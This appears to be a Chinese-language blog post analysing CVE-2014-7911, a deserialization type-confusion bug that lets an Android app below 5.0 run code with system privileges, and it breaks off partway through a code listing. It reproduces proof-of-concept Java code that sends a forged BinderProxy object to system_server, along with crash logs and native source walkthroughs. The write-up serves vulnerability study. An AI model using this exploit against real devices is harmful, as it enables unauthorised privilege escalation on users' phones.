<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      CVE-2014-7911 Android本地提权漏洞分析与利用 | Zke1ev3n&#39;s Blog 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="Zke1ev3n">
    
    

    <meta name="description" content="概述前面我们了解了Android Binder机制的基本原理，当然仅仅了解是不够的，我们要做到：Know it and hack it。这篇文章我们就来分析一个和Binder相关的漏洞：CVE-2014-7911。这是由Jann Horn发现的一个Android本地提权漏洞，能够使普通应用的权限提升到System权限，影响Android5.0以下版本。这个漏洞是非常值得Android安全研究人员学">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2014-7911 Android本地提权漏洞分析与利用 | Zke1ev3n's Blog">
<meta property="og:url" content="http://yoursite.com/2016/08/02/CVE-2014-7911-Android本地提权漏洞分析与利用/index.html">
<meta property="og:site_name" content="Zke1ev3n's Blog">
<meta property="og:description" content="概述前面我们了解了Android Binder机制的基本原理，当然仅仅了解是不够的，我们要做到：Know it and hack it。这篇文章我们就来分析一个和Binder相关的漏洞：CVE-2014-7911。这是由Jann Horn发现的一个Android本地提权漏洞，能够使普通应用的权限提升到System权限，影响Android5.0以下版本。这个漏洞是非常值得Android安全研究人员学">
<meta property="og:image" content="http://yoursite.com/1.PNG">
<meta property="og:image" content="http://yoursite.com/2015110404465729794CVE-2014-7911.png">
<meta property="og:updated_time" content="2016-08-10T07:49:54.474Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2014-7911 Android本地提权漏洞分析与利用 | Zke1ev3n's Blog">
<meta name="twitter:description" content="概述前面我们了解了Android Binder机制的基本原理，当然仅仅了解是不够的，我们要做到：Know it and hack it。这篇文章我们就来分析一个和Binder相关的漏洞：CVE-2014-7911。这是由Jann Horn发现的一个Android本地提权漏洞，能够使普通应用的权限提升到System权限，影响Android5.0以下版本。这个漏洞是非常值得Android安全研究人员学">
<meta name="twitter:image" content="http://yoursite.com/1.PNG">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Zke1ev3n&#39;s Blog</a></h1>
        <hr class="panel-cover__divider" />

        
        <p class="panel-cover__description">
          The quieter you became,the more you are able to hear.
        </p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">CVE-2014-7911 Android本地提权漏洞分析与利用</h1>

    

    <div class="post-meta">
      <time datetime="2016-08-02" class="post-meta__date date">2016-08-02</time> 

      <span class="post-meta__tags tags">

          

          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>前面我们了解了Android Binder机制的基本原理，当然仅仅了解是不够的，我们要做到：Know it and hack it。这篇文章我们就来分析一个和Binder相关的漏洞：CVE-2014-7911。这是由Jann Horn发现的一个Android本地提权漏洞，能够使普通应用的权限提升到System权限，影响Android5.0以下版本。这个漏洞是非常值得Android安全研究人员学习的一个漏洞，因为这个漏洞涉及到Android Binder，Java序列化，Dalvik GC机制，Heap spary，ROP，Stack pivot等知识，很有学习价值。</p>
<blockquote>
<p>文章的内容主要来源于公开的资料，我在其基础上添加了一些细节。<br><a id="more"></a></p>
</blockquote>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h4><p>这个漏洞的成因在于在Android&lt;5.0的版本中，java.io.ObjectInputStream并未校验输入的java对象是否是可序列化的。攻击者可以构建一个不可序列化的对象实例，并且构建恶意的成员变量，当该对象被ObjectInputStream反序列化的时候，就会发生类型混淆，其成员变量被当做本地代码的指针，使攻击者可以获得程序的控制权。<br>具体的来说，是android.os.BinderProxy这个类，本身是不可序列化的，在系统GC的时候，会调用到它的finalize方法，在这个方法中调用到了一个指针，而这个指针正好可以被我们控制，所以可以通过构造恶意的指针来达到代码执行。下面我们结合jann Horn的Poc具体分析下漏洞成因：<br>首先构造一个可序列化的对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> AAdroid.os;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * Created by auo on 15-6-25.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里定义了一个AAdroid.os.BinderProxy对象，并且实现了Serializable接口，使得这个类可序列化，因为我们需要现将这个类放入到Bundle中才能传入到system_server进程，在传入的过程中修改它的类型位android.os.BinderProxy，这样在system_server反序列化的时候就会触发异常。我们继续看发送函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">int</span> staticAddr)</span> </span>&#123;</span><br><span class="line">        Context context = getBaseContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">            BinderProxy evilProxy = <span class="keyword">new</span> BinderProxy();</span><br><span class="line">            bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br><span class="line"></span><br><span class="line">            Class stubClass = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class inner : Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">                    stubClass = inner;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">            TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Class proxyClass = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class inner : stubClass.getDeclaredClasses()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">                    proxyClass = inner;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line">            Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">            mServiceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object mService = mServiceField.get(userManager);</span><br><span class="line"></span><br><span class="line">            Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">            mRemoteField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            mRemote = (IBinder) mRemoteField.get(mService);</span><br><span class="line"></span><br><span class="line">            UserHandle userHandle = android.os.Process.myUserHandle();</span><br><span class="line">            setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里通过一系列的反射来获取android.os.IUserManager.Stub.Proxy.mRemote类，IUserManager对象是AIDL自动生成的，在UserManager中定义了一个实例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class UserManager &#123;</span><br><span class="line"></span><br><span class="line">    private static String TAG = &quot;UserManager&quot;;</span><br><span class="line">    private final IUserManager mService;</span><br><span class="line">    private final Context mContext;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过反射获取到这个实例的mRemote对象，我们前面已经知道在Binder客户端的mRemote其实是一个BinderProxy类，这个类的transact函数将方法描述符和参数传递给服务端，进行远程调用。所以这里获得这个对象其实就是为了像servermanager传递我们构造的恶意对象，为什么要传递给servermanager呢，这是因为servermanager拥有system权限，把对象传递给它，servermanager在反序列化时发生类型混淆，我们就可以在servermanager进程用system权限执行代码。所以通过前面我们了解到，这里的客户端和服务端包括发送的恶意对象的类都不是固定的，因为漏洞的关键点不在这两个类中而是在ObjectInputStream这个类中，所以只要满足能够触发漏洞的条件即可。下面我们具体来看发送对象的过程中做了什么工作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span><br><span class="line">            userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException</span><br><span class="line">    </span>&#123;</span><br><span class="line">        android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">        android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">            _data.writeString(packageName);</span><br><span class="line">            _data.writeInt(<span class="number">1</span>);</span><br><span class="line">            restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">            _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                    data[i] = <span class="string">'a'</span>;</span><br><span class="line">                    data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            _data.recycle();</span><br><span class="line">            _data = Parcel.obtain();</span><br><span class="line">            _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">            _reply.readException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            _reply.recycle();</span><br><span class="line">            _data.recycle(); &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到这个函数和一般的Binder客户端发送数据的方法很类似，区别在于这里面有这样一段代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">        data[i] = <span class="string">'a'</span>;</span><br><span class="line">        data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">_data.recycle();</span><br><span class="line">_data = Parcel.obtain();</span><br><span class="line">_data.unmarshall(data, <span class="number">0</span>, data.length);</span><br></pre></td></tr></table></figure></p>
<p>这里首先调用要发送的parcel对象的marshall方法，作用类似序列化，获得一个byte[]数组。然后将这个数组中的”AAdr”修改成”andr”。我们前面知道要传输的对象的类型是AAdroid.os.BinderProxy，所以这里相当于把对象类型修改成了android.os.BinderProxy，这样就成功发送了恶意的对象。为什么要转换成BinderProxy对象呢，前面说这个对象不是固定的，只要能触发漏洞的条件即可，那么这个对象为什么能触发漏洞条件呢，我们下面会具体分析。<br>安装Poc，启动Activity后将其最小化，触发GC，这会引起system_manager崩溃并重启，logcat日志类似下面这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</span><br><span class="line">...</span><br><span class="line">I/DEBUG   (  241): backtrace:</span><br><span class="line">I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</span><br><span class="line">I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so</span><br><span class="line">I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</span><br><span class="line">I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so</span><br><span class="line">I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)</span><br><span class="line">I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</span><br><span class="line">I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</span><br><span class="line">I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</span><br><span class="line">I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so</span><br><span class="line">I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)</span><br><span class="line">I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)</span><br></pre></td></tr></table></figure></p>
<p>这里看到servermanager崩溃的原因是访问了异常的内存地址，而这个地址0x1337bef3和我们前面在序列化对象中设置的0x1337beef很接近。下面我们就具体分析在native层漏洞触发的原因。</p>
<h4 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h4><p>我们前面说到，android.os.BinderProxy这个对象本身是不可序列化的，但是因为ObjectInputStream这个对象在反序列化时没有做校验，造成了类型混淆(type confusion)漏洞。BinderProxy的filed被Native代码处理成指针，这个filed就是我们在代码中设置的mOrgue。<br>BinderProxy的finalize方法调用了native代码，将mOruge处理成指针。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">			destroy();</span><br><span class="line">	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">		<span class="keyword">super</span>.finalize();	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>反序列化的时候调用到java.io.ObjectInputStream对象的readObject()方法，这个方法从输入流中读取出对象，也就是我们定义的BinderProxy对象。这个对象被创建后，因为代码中没有再引用它，所以它会进入到”可复活状态”，准备被GC回收，在回收前就会调用到它的finalize()方法。</p>
<blockquote>
<blockquote>
<p>更多关于java GC的内容可以自行在网上查阅</p>
</blockquote>
</blockquote>
<p>这里的destroy()是一个本地方法。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> native final <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>它对应的native方法为：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	IBinder* b = (IBinder*)</span><br><span class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">	DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">	LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">	drl-&gt;decstrong((<span class="keyword">void</span>*)javaobjectforibinder);</span><br><span class="line">	b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">	IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br></pre></td></tr></table></figure></p>
<p>将gBinderProxyoffsets.mOrgue转换成一个DeathRecipientList*对象的指针，而gBinderProxyoffsets.mOrgue是在int_register_android_os_BinderProxy中完成初始化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gBinderProxyOffsets.mObject  = env-&gt;GetFieldID(clazz, &quot;mObject&quot;, &quot;I&quot;);</span><br><span class="line">gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, &quot;mOrgue&quot;, &quot;I&quot;);</span><br></pre></td></tr></table></figure></p>
<p>所以可以看到我们设置的mOrgue被处理成了一个对象指针。而之后调用了这个对象的方法。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drl-&gt;decstrong((<span class="keyword">void</span>*)javaobjectforibinder);</span><br></pre></td></tr></table></figure></p>
<p>这个方法的定义在DeathRecipientList的父类RefBase中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的mRefs是RefBase对象中第一个成员变量，可以看到RefBase的定义如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 